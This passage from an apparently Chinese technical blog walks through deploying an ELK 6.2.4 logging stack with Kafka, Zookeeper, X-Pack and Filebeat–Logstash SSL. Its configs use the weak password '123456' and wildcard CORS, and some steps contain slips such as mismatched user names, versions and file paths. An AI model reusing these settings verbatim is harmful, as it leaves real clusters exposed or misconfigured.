&quot;nginx_access&quot;&#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">      gsub =&gt; [&quot;message&quot;, &quot;\\x0D&quot;, &quot;&quot;]  #替换字符</span><br><span class="line">      gsub =&gt; [&quot;message&quot;, &quot;\\x0A&quot;, &quot;&quot;]</span><br><span class="line">      gsub =&gt; [&quot;message&quot;, &quot;\\x22&quot;, &quot;&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    json &#123;</span><br><span class="line">      source =&gt; &quot;message&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  if [fields][dep] == &quot;nginx_access&quot;&#123;</span><br><span class="line">    kafka &#123;</span><br><span class="line">      id =&gt;&quot;my_kafka_id&quot;</span><br><span class="line">      codec =&gt; json</span><br><span class="line">      topic_id =&gt;&quot;test&quot;</span><br><span class="line">      bootstrap_servers =&gt; &quot;192.168.1.21:9092&quot;</span><br><span class="line">      batch_size =&gt; 5</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-接收mysql慢查询日志"><a href="#2-接收mysql慢查询日志" class="headerlink" title="2.接收mysql慢查询日志"></a>2.接收mysql慢查询日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    beats &#123;</span><br><span class="line">    port =&gt; 5044</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">if [fields][logtype] == &quot;mysql_slow&quot;&#123;</span><br><span class="line">    kafka &#123;</span><br><span class="line">      id =&gt;&quot;my_kafka_id&quot;</span><br><span class="line">      codec =&gt; json</span><br><span class="line">      topic_id =&gt;&quot;test&quot;</span><br><span class="line">      bootstrap_servers =&gt; &quot;192.168.1.23:9092&quot;</span><br><span class="line">      batch_size =&gt; 5</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四-Kafka配置"><a href="#四-Kafka配置" class="headerlink" title="四.Kafka配置"></a>四.Kafka配置</h3><p>创建数据和日志目录<br><code>mkdir /kafka/zookeeper/data</code><br><code>mkdir /kafka/zookeeper/logs</code><br>创建myid 文件(每台服务器写入不同值)<br><code>echo 1 &gt; /kafka/zookeeper/data/myid</code><br>配置zookeeper<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">maxClientCnxns=0</span><br><span class="line">dataDir=/kafka/zookeeper/data</span><br><span class="line">dataLogDir=/kafka/zookeeper/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">#最大客户端连接数</span><br><span class="line">maxClientCnxns=20</span><br><span class="line">#心跳间隔</span><br><span class="line">tickTime=2000</span><br><span class="line">当初始化连接时间超过该值，则表示连接失败。</span><br><span class="line">initLimit=10</span><br><span class="line">#此配置项表示Leader与Follower之间发送消息时，请求和应答时间长度。</span><br><span class="line">syncLimit=5</span><br><span class="line">#第一个端口是连接到leader的端口，第二个是用来选举leader 用的端口</span><br><span class="line">server.1=192.168.1.21:2888:3888</span><br><span class="line">server.2=192.168.1.22:2888:3888</span><br><span class="line">server.3=192.168.1.23:2888:3888</span><br></pre></td></tr></table></figure></p><p>配置kafka<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">broker.id=0 ##集群每个服务器不同</span><br><span class="line">#消费者的访问端口，logstash或者elasticsearch</span><br><span class="line">listeners=PLAINTEXT://192.168.1.21:9092</span><br><span class="line">#接收和发送线程数</span><br><span class="line">num.network.threads=3</span><br><span class="line">#处理请求线程数</span><br><span class="line">num.io.threads=8</span><br><span class="line">#发送缓冲区</span><br><span class="line">socket.send.buffer.bytes=102400</span><br><span class="line">#接收缓冲区</span><br><span class="line">socket.receive.buffer.bytes=102400</span><br><span class="line">#套接字服务器接受请求上限(防止OOM)。</span><br><span class="line">socket.request.max.bytes=104857600</span><br><span class="line">#以逗号分隔的目录列表，其中存储日志文件。</span><br><span class="line">log.dirs=/home/kafka/logs</span><br><span class="line">num.partitions=1</span><br><span class="line">num.recovery.threads.per.data.dir=1</span><br><span class="line">offsets.topic.replication.factor=1</span><br><span class="line">transaction.state.log.replication.factor=1</span><br><span class="line">transaction.state.log.min.isr=1</span><br><span class="line">zookeeper.connect=192.168.1.21:2181,192.168.1.22:2181,192.168.1.23:2181</span><br><span class="line">zookeeper.connection.timeout.ms=6000</span><br><span class="line">group.initial.rebalance.delay.ms=0</span><br></pre></td></tr></table></figure></p><p>启动集群<br><code>nohup /kafka/bin/zookeeper-server-start.sh zookeeper.properties &gt;&gt;/dev/null 2&gt;&amp;1 &amp;</code><br><code>nohup /kafka/bin/kafka-server-start.sh /kafka/config/server.properties &gt;&gt;/dev/null 2&gt;&amp;1 &amp;</code><br>测试集群<br><code>/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test</code><br><code>/kafka/bin/kafka-topics.sh --zookeeper 192.168.1.21:2181 --list</code></p><h2 id="五、Elasticsearch配置"><a href="#五、Elasticsearch配置" class="headerlink" title="五、Elasticsearch配置"></a>五、Elasticsearch配置</h2><p>由于elasticsearch无法在root权限下运行，在此创建账号elk<br><code>useradd eeelk</code><br>解压elasticsearch文件<br><code>tar -zxvf elasticserch-6.2.4.tar.gz</code><br>修改配置文件（三台服务器均需修改，node.name不同即可）<br><code>vi elasticsearch-6.2.4/config/elasticsearch.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: myescluster         #自定义修改一个集群名称</span><br><span class="line">node.name: node1                 #节点名称</span><br><span class="line">network.host: 192.168.1.41      #节点IP（或者解析的主机名）</span><br><span class="line">http.port: 9200</span><br><span class="line">http.cors.enabled: true</span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br><span class="line">http.cors.allow-headers: Authorization,X-Requested-With,Content-Length,Content-Type</span><br><span class="line">bootstrap.memory_lock: false          #设置elasticsearch的进程锁住内存</span><br><span class="line">discovery.zen.ping.unicast.hosts: [&quot;192.168.1.41&quot;, &quot;192.168.1.42&quot;,&quot;192.168.1.43&quot;]  #集群个节点IP地址</span><br><span class="line">discovery.zen.minimum_master_nodes: 2      #为了避免脑裂，集群节点数最少为 半数+1</span><br></pre></td></tr></table></figure></p><p>向limits.conf添加以下内容（设置允许打开文件最大值）<br><code>vi /etc/security/limits.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* soft nofile 655360</span><br><span class="line">* hard nofile 655360</span><br><span class="line">root soft nofile 100001</span><br><span class="line">root hard nofile 100002</span><br></pre></td></tr></table></figure></p><p>向sysctl.conf中添加以下内容（设置最大线程数）<br><code>vi /etc/sysctl.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.max_map_count=655360</span><br></pre></td></tr></table></figure></p><p>使配置生效<br><code>sysctl -p</code><br>赋予elk用户文件夹权限<br><code>chown -R elk.elk /home/elk/elasticsearch-6.2.4/</code><br>运行elk<br><code>su eeelk</code></p><p><code>./elasticsearch-6.2.4/bin/elasticsearch -d</code><br>打开浏览器访问<a href="http://ip:9200" target="_blank" rel="noopener">http://ip:9200</a><br><img src="/deployment/ELK6-2-4部署/elasticsearch9200.png"></p><h2 id="六、elasticsearch-head安装"><a href="#六、elasticsearch-head安装" class="headerlink" title="六、elasticsearch-head安装"></a>六、elasticsearch-head安装</h2><p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官网</a>查询对应版本下载连接<br><img src="/deployment/ELK6-2-4部署/nodejs版本.png"><br>安装nodejs<br><code>wget https://nodejs.org/dist/v8.11.3/node-v8.11.3-linux-x64.tar.xz</code></p><p><code>xz -d node-v8.11.2-linux-x64.tar.xz</code></p><p><code>tar  xvf node-v8.11.2-linux-x64.tar</code></p><p>将nodejs加入环境变量<br><code>vi /etc/profile</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export NODE_HOME=/home/eeelk/node-v8.11.3-linux-x64</span><br><span class="line">export PATH=$NODE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure></p><p>使环境变量生效<br><code>source /etc/profile</code><br>安装elasticsearch-head<br><code>wget https://github.com/mobz/elasticsearch-head/archive/master.zip</code><br><code>unzip master.zip</code><br><code>cd elasticsearch-head-master</code><br><code>npm install</code><br>如果安装时报错提示phantomjs-prebuilt安装失败则执行<br><code>npm install phantomjs-prebuilt@2.1.16 --ignore-scripts</code><br>修改elasticsearch-head配置<br><code>vi Gruntfile.js</code><br><img src="/deployment/ELK6-2-4部署/elasticsearch-head.png"><br>启动elasticsearch-head<br><code>npm run start</code><br>打开浏览器访问<a href="http://ip:9100" target="_blank" rel="noopener">http://ip:9100</a><br><img src="/deployment/ELK6-2-4部署/elasticsearch-head9100.png"></p><h2 id="七、kibana配置"><a href="#七、kibana配置" class="headerlink" title="七、kibana配置"></a>七、kibana配置</h2><p>修改配置文件<br><code>vi kibana-6.2.4/config/kibana.yml</code><br><img src="/deployment/ELK6-2-4部署/kibana配置.png"><br>启动kibana<br><code>./kibana-6.2.4/bin/kibana</code><br>访问<a href="http://ip:5601" target="_blank" rel="noopener">http://ip:5601</a><br><img src="/deployment/ELK6-2-4部署/kibana5601.png"></p><h2 id="八、X-Pack安装"><a href="#八、X-Pack安装" class="headerlink" title="八、X-Pack安装"></a>八、X-Pack安装</h2><h3 id="1-在elasticsearh上安装x-pack"><a href="#1-在elasticsearh上安装x-pack" class="headerlink" title="1.在elasticsearh上安装x-pack"></a>1.在elasticsearh上安装x-pack</h3><p><code>/elasticsearch-6.2.4/bin/elasticsearch-plugin install x-pack</code><br>安装完成后重启elasticsearch服务后，初始化密码<br><code>./elasticsearch-6.2.4/bin/x-pack/setup-passwords interactive</code></p><h3 id="2-在logstash上安装x-Pack"><a href="#2-在logstash上安装x-Pack" class="headerlink" title="2.在logstash上安装x-Pack"></a>2.在logstash上安装x-Pack</h3><p><code>.logstash-6.2.4/bin/logstash-plugin install x-pack</code><br>在logstash.yml中设置账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xpack.monitoring.elasticsearch.username: logstash_system</span><br><span class="line">xpack.monitoring.elasticsearch.password: 初始化elk中x-pack生成的密码</span><br></pre></td></tr></table></figure></p><p>在logstash的config文件中添加elasticsearh账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">       hosts =&gt; [&quot;192.168.1.41:9200&quot;,&quot;192.168.1.42:9200&quot;,&quot;192.168.1.43:9200&quot;]</span><br><span class="line">       user =&gt; &quot;elastic&quot;</span><br><span class="line">       password =&gt; &quot;123456&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="3-在kibana上安装x-pack"><a href="#3-在kibana上安装x-pack" class="headerlink" title="3.在kibana上安装x-pack"></a>3.在kibana上安装x-pack</h3><p><code>/kibana-6.2.4/bin/kibana-plugin install x-pack</code><br>在kibana配置中设置账号密码<br><code>vi kibana-6.2.4/config/kibana.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.username: &quot;elasti&quot;</span><br><span class="line">elasticsearch.password: &quot;123456&quot;</span><br></pre></td></tr></table></figure></p><p>在elasticsearch配置中启用x-pack验证<br><code>vi elasticsearch-6.2.4/config/kibana.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.enabled: true</span><br></pre></td></tr></table></figure></p><p>重启elasticsearch、kibana、logstash服务</p><h2 id="九、Logstash配置"><a href="#九、Logstash配置" class="headerlink" title="九、Logstash配置"></a>九、Logstash配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">input&#123;</span><br><span class="line">      kafka&#123;</span><br><span class="line">        codec =&gt; json</span><br><span class="line">        bootstrap_servers =&gt; &quot;192.168.1.21:9092,192.168.1.22:9092,192.168.1.23:9092&quot;</span><br><span class="line">        auto_offset_reset =&gt; &quot;latest&quot; #从最新的偏移量开始消费</span><br><span class="line">        consumer_threads =&gt; 5</span><br><span class="line">        decorate_events =&gt; true #此属性会将当前topic、offset、group、partition等信息也带到message中</span><br><span class="line">        topics =&gt; &quot;test&quot; #数组类型，可配置多个topic</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">   geoip &#123;</span><br><span class="line">      source =&gt; &quot;slbip&quot; # 与日志中访问地址的key要对应</span><br><span class="line">      target =&gt; &quot;geoip&quot;</span><br><span class="line">      database =&gt; &quot;GeoLite2-City_20180605/GeoLite2-City.mmdb&quot;</span><br><span class="line">      add_field =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;%&#123;[geoip][longitude]&#125;&quot; ]</span><br><span class="line">      add_field =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;%&#123;[geoip][latitude]&#125;&quot; ]</span><br><span class="line">  &#125;</span><br><span class="line">  mutate &#123;</span><br><span class="line">      convert =&gt; [ &quot;[geoip][coordinates]&quot;,&quot;float&quot; ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output&#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts =&gt; [&quot;192.168.1.41:9200&quot;,&quot;192.168.1.42:9200&quot;,&quot;192.168.1.43:9200&quot;]</span><br><span class="line">    index =&gt; &quot;logstash-%&#123;[fields][dep]&#125;-%&#123;[fields][project]&#125;-%&#123;[fields][logsource]&#125;-%&#123;+YYYY.MM.dd&#125;&quot;</span><br><span class="line">    user =&gt; &quot;elastic&quot;</span><br><span class="line">    password =&gt; &quot;123456&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="十、filebeat-amp-logstash通过ssl交互"><a href="#十、filebeat-amp-logstash通过ssl交互" class="headerlink" title="十、filebeat&amp;logstash通过ssl交互"></a>十、filebeat&amp;logstash通过ssl交互</h2><h3 id="安装openssl"><a href="#安装openssl" class="headerlink" title="安装openssl"></a>安装openssl</h3><p><code>wget https://www.openssl.org/source/openssl-1.1.1-pre8.tar.gz</code><br><code>tar -zxvf openssl-1.1.1-pre8.tar.gz</code><br><code>cd openssl-1.1.1-pre8</code><br><code>./config --prefix=/usr/local/openssl</code><br><code>./config -t</code><br><code>make</code><br><code>make install</code></p><h3 id="创建证书"><a href="#创建证书" class="headerlink" title="创建证书"></a>创建证书</h3><p>创建证书目录<br><code>mkdir -p /etc/pki/tls/certs</code><br><code>mkdir -p /etc/pki/tls/private</code><br>生成证书<br><code>vi /etc/ssl/openssl.cnf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在[ v3_ca ]下面填写</span><br><span class="line">subjectAltName = IP:192.168.1.21</span><br></pre></td></tr></table></figure></p><p><code>cd /etc/pki/tls/</code><br><code>openssl req -config /usr/local/openssl/ssl/openssl.cnf -x509 -days 3650 -batch -node</code><br><code>openssl req -subj &#39;/CN=192.168.1.21/&#39; -x509 -days $((100 * 365)) -batch -nodes -newkey rsa:2048 -keyout pki/tls/private/logstash.key -out pki/tls/certs/logstash.crt</code><br>在filebeat机器上生成证书文件</p><h3 id="配置证书"><a href="#配置证书" class="headerlink" title="配置证书"></a>配置证书</h3><p>将filebeat.crt logstash.crt 传到对方服务器<br>修改logstash配置<br><code>vi /home/elk/logstash-6.2.4/config/logs.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line"> beats &#123;</span><br><span class="line">   host =&gt; &quot;192.168.1.21&quot;</span><br><span class="line">   port =&gt; 5044</span><br><span class="line">   ssl =&gt; true</span><br><span class="line">   ssl_certificate_authorities =&gt; [&quot;/etc/pki/tls/certs/filebeat.crt&quot;]</span><br><span class="line">   ssl_certificate =&gt; &quot;/etc/pki/tls/certs/logstash.crt&quot;</span><br><span class="line">   ssl_key =&gt; &quot;/etc/pki/tls/private/logstash.key&quot;</span><br><span class="line">   ssl_verify_mode =&gt; &quot;force_peer&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改filebeat配置<br><code>vi /etc/filebeat/filebeat.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output.logstash:</span><br><span class="line">  hosts: [&quot;192.168.1.21:5044&quot;]</span><br><span class="line">  ssl.certificate_authorities: [&quot;/etc/pki/tls/certs/logstash.crt&quot;]</span><br><span class="line">  ssl.certificate: &quot;/etc/pki/tls/certs/filebeat.crt&quot;</span><br><span class="line">  ssl.key: &quot;/etc/pki/tls/private/filebeat.key&quot;</span><br></pre></td></tr></table></figure></p><p>重启logstash和filebeat服务</p>]]></content>
      
      <categories>
          
          <category> deployment </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 企业安全 </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
